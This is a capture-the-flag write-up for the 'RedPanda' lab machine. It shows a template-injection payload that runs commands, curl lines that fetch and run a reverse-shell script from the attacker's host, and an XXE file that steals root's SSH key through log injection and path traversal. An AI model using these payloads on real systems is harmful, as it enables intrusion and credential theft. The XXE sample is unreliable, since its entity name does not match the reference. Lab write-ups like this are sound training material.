# RedPanda

## Gaining Access

Nmap scan:

```
$ nmap -p- --min-rate 5000 10.129.227.207
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-10 09:28 EDT
Nmap scan report for 10.129.227.207
Host is up (0.0087s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT     STATE SERVICE
22/tcp   open  ssh
8080/tcp open  http-proxy
```

### Red Panda Search SSTI

The page was some kind of search engine:

<figure><img src="../../../.gitbook/assets/image (1153).png" alt=""><figcaption></figcaption></figure>

When we search for something, it shows our result back on the screen:

<figure><img src="../../../.gitbook/assets/image (1255).png" alt=""><figcaption></figcaption></figure>

There are a few possibilities in my mind:

* XSS -> But there's no users present to 'view' our requests
* SQL Injection -> Might have a database present, but not typical for non-logins.&#x20;
* SSTI

When we use `${7*7}`, we get a unique error:

<figure><img src="../../../.gitbook/assets/image (2175).png" alt=""><figcaption></figcaption></figure>

It seems that some characters are being blocked. We can fuzz this using `wfuzz`.&#x20;

```
$ wfuzz -w /usr/share/seclists/Fuzzing/alphanum-case-extra.txt  -u http://10.129.227.207:8080/search -d name=FUZZ --sl=0 /usr/lib/python3/dist-packages/wfuzz/__init__.p:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.129.227.207:8080/search
Total requests: 95

=====================================================================
ID           Response   Lines    Word       Chars       Payload                     
=====================================================================

000000005:   400        0 L      2 W        110 Ch      "%"                         
000000011:   500        0 L      3 W        120 Ch      "+"                         
000000009:   500        0 L      3 W        120 Ch      ")"                         
000000060:   500        0 L      3 W        120 Ch      "\"                         
000000093:   500        0 L      3 W        120 Ch      "}"                         
000000091:   500        0 L      3 W        120 Ch      "{" 
```

it seems that some of the characters here straight up cause crashes. When we filter for the word `banned`, then we see some more characters:

```
$ wfuzz -w /usr/share/seclists/Fuzzing/alphanum-case-extra.txt  -u http://10.129.227.207:8080/search -d name=FUZZ --sw=69     /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.129.227.207:8080/search
Total requests: 95

=====================================================================
ID           Response   Lines    Word       Chars       Payload                     
=====================================================================

000000004:   200        28 L     69 W       755 Ch      "$"                         
000000063:   200        28 L     69 W       755 Ch      "_"                         
000000094:   200        28 L     69 W       755 Ch      "~"
```

These characters are banned, but the rest are not. This is what happens when I used `#{7*7}:`

<figure><img src="../../../.gitbook/assets/image (2063).png" alt=""><figcaption></figcaption></figure>

This confirms that SSTI works, and the payload was taken from a Freemarker cheat sheet, meaning the page runs in Java (but not necessarily FreeMarker!). We can use this payload after replacing the `$` with `*` because `#` doesn't seem to work.&#x20;

<pre><code><strong>*{T(java.lang.Runtime).getRuntime().exec('curl 10.10.14.13/sstirce')}
</strong></code></pre>

<figure><img src="../../../.gitbook/assets/image (715).png" alt=""><figcaption></figcaption></figure>

From this, I will get a hit back on my Python server:

```
$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.129.227.207 - - [10/May/2023 09:43:33] code 404, message File not found
10.129.227.207 - - [10/May/2023 09:43:33] "GET /sstirce HTTP/1.1" 404 -
```

Now, we can easily get a reverse shell. We can do so by first downloading the shell on the machine, then executing it using `bash`:

```bash
curl 10.10.14.13/shell.sh -o /tmp/rev
bash /tmp/rev
```

Our listener port would catch a shell:

<figure><img src="../../../.gitbook/assets/image (4001).png" alt=""><figcaption></figcaption></figure>

## Privilege Escalation

### Identifying XXE Injection

The first thing I noticed was we are part of the `logs` group. We can use the `find` command to see all files owned by the user:

<pre class="language-bash"><code class="lang-bash"><strong>$ find / -group logs 2> /dev/null
</strong># truncated output
/credits
/credits/damian_creds.xml
/credits/woodenk_creds.xml
/opt/panda_search/redpanda.log
</code></pre>

The `/credits` directory contains XML files with the number of views that each Artist got for their respective images. However, the `/opt` directory has some interesting stuff.&#x20;

```
woodenk@redpanda:/opt$ ll
total 24
drwxr-xr-x  5 root root 4096 Jun 23  2022 ./
drwxr-xr-x 20 root root 4096 Jun 23  2022 ../
-rwxr-xr-x  1 root root  462 Jun 23  2022 cleanup.sh*
drwxr-xr-x  3 root root 4096 Jun 14  2022 credit-score/
drwxr-xr-x  6 root root 4096 Jun 14  2022 maven/
drwxrwxr-x  5 root root 4096 Jun 14  2022 panda_search/
```

`credit-score` was a new thing. Within it there were a lot of directories leading to an `App.java` file that contains source code for it. We can break it down here.

It firsts takes a string and splits it into 3 portions, and only the last one is important.&#x20;

```java
public static Map parseLog(String line) {
        String[] strings = line.split("\\|\\|");
        Map map = new HashMap<>();
        map.put("status_code", Integer.parseInt(strings[0]));
        map.put("ip", strings[1]);
        map.put("user_agent", strings[2]);
        map.put("uri", strings[3]);
        return map;
    }
```

After parsing the string (`uri`), it checks to see which Artist has an image matching the query. The `uri` variable is passed into the `fullpath` variable without sanitisation, making it vulnerable to directory traversal if we can control it. The Artist variable is embedded in the metadata of the image, which is also controllable.&#x20;

```java
public static String getArtist(String uri) throws IOException, JpegProcessingException
    {
        String fullpath = "/opt/panda_search/src/main/resources/static" + uri;
        File jpgFile = new File(fullpath);
        Metadata metadata = JpegMetadataReader.readMetadata(jpgFile);
        for(Directory dir : metadata.getDirectories())
        {
            for(Tag tag : dir.getTags())
            {
                if(tag.getTagName() == "Artist")
                {
                    return tag.getDescription();
                }
            }
        }
        return "N/A";
    }
```

Afterwards, it basically updates the XML files within the logs:

```java
public static void addViewTo(String path, String uri) throws JDOMException, IOException
    {
        SAXBuilder saxBuilder = new SAXBuilder();
        XMLOutputter xmlOutput = new XMLOutputter();
        xmlOutput.setFormat(Format.getPrettyFormat());
        File fd = new File(path);
        Document doc = saxBuilder.build(fd);
        Element rootElement = doc.getRootElement();
        for(Element el: rootElement.getChildren())
        {
            if(el.getName() == "image")
            {
                if(el.getChild("uri").getText().equals(uri))
                {
                    Integer totalviews = Integer.parseInt(rootElement.getChild("totalviews").getText()) + 1;
                    System.out.println("Total views:" + Integer.toString(totalviews));
                    rootElement.getChild("totalviews").setText(Integer.toString(totalviews));
                    Integer views = Integer.parseInt(el.getChild("views").getText());
                    el.getChild("views").setText(Integer.toString(views + 1));
                }
            }
        }
        BufferedWriter writer = new BufferedWriter(new FileWriter(fd));
        xmlOutput.output(doc, writer);
    }
```

The goal here is to somehow pass an XML file that we control to the `addViewTo` function that has a malicious XML payload. The function above does not seem to check or verify the XML that is passed to it, so I'll be trying to read the `/root/.ssh/id_rsa` file.&#x20;

Here's the XML file that I constructed:

```markup
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY example SYSTEM "/root/.ssh/id_rsa"> ]>
<credits>
  <author>damian</author>
  <image>
    <uri>/img/angy.jpg</uri>
    <views>1</views>
    <key>&foo;</key>
  </image>
  <image>
    <uri>/img/shy.jpg</uri>
    <views>0</views>
  </image>
  <image>
    <uri>/img/crafty.jpg</uri>
    <views>0</views>
  </image>
  <image>
    <uri>/img/peter.jpg</uri>
    <views>0</views>
  </image>
  <totalviews>0</totalviews>
</credits>
```

Afterwards, we can transfer this to the machine via `wget`. Then we need to somehow put our user controlled string into the machine to execute.

### Panda Search Logs

When reading the source code for `panda_search`, within `MainController.java`, it seems to check for the author of the files created:

```java
 if(author.equals("woodenk") || author.equals("damian"))
                {
                        String path = "/credits/" + author + "_creds.xml";
                        File fd = new File(path);
                        Document doc = saxBuilder.build(fd);
                        Element rootElement = doc.getRootElement();
                        String totalviews = rootElement.getChildText("totalviews");
                        List<Element> images = rootElement.getChildren("image");
                        for(Element image: images)
                                System.out.println(image.getChildText("uri"));
                        model.addAttribute("noAuthor", false);
                        model.addAttribute("author", author);
                        model.addAttribute("totalviews", totalviews);
                        model.addAttribute("images", images);
                        return new ModelAndView("stats.html");
                }     
```

This is where `/credits` come in. The logs are then written to `/opt/panda_search/redpanda.log`.

```java
public class RequestInterceptor extends HandlerInterceptorAdapter {
    @Override
    public boolean preHandle (HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception {
        System.out.println("interceptor#preHandle called. Thread: " + Thread.currentThread().getName());
        return true;
    }

    @Override
    public void afterCompletion (HttpServletRequest request, HttpServletResponse response, Object handler, Exception ex) throws Exception {
        System.out.println("interceptor#postHandle called. Thread: " + Thread.currentThread().getName());
        String UserAgent = request.getHeader("User-Agent");
        String remoteAddr = request.getRemoteAddr();
        String requestUri = request.getRequestURI();
        Integer responseCode = response.getStatus();
        /*System.out.println("User agent: " + UserAgent);
        System.out.println("IP: " + remoteAddr);
        System.out.println("Uri: " + requestUri);
        System.out.println("Response code: " + responseCode.toString());*/
        System.out.println("LOG: " + responseCode.toString() + "||" + remoteAddr + "||" + UserAgent + "||" + requestUri);
        FileWriter fw = new FileWriter("/opt/panda_search/redpanda.log", true);
        BufferedWriter bw = new BufferedWriter(fw);
        bw.write(responseCode.toString() + "||" + remoteAddr + "||" + UserAgent + "||" + requestUri + "\n");
        bw.close();
    }
}
```

So this is where we have to enter our malicious string to start our exploit.

### Exploit

First, let's grab the image from the website and change the metadata using `exiftool`.

```
$ exiftool -Artist="../tmp/read" lazy.jpg
    1 image files updated
```

The reason we are using this is because the XML files would be read from `/credits../tmp/read.xml` after a single `../`. Then we need to transfer our XML file over as `read_creds.xml`.&#x20;

Afterwards, we can create our malicious string based on the template and drop it into `/opt/panda_search/redpanda.log`:

```
echo 'a||aa||aa||../../../../../../../../../../../../../tmp/read.jpg' >> redpanda.log
```

Then we wait for a little bit, then read the `read_creds.xml` file to find the `root` SSH key.&#x20;

<figure><img src="../../../.gitbook/assets/image (3566).png" alt=""><figcaption></figcaption></figure>

Then we can `ssh` in as `root`.

<figure><img src="../../../.gitbook/assets/image (902).png" alt=""><figcaption></figcaption></figure>
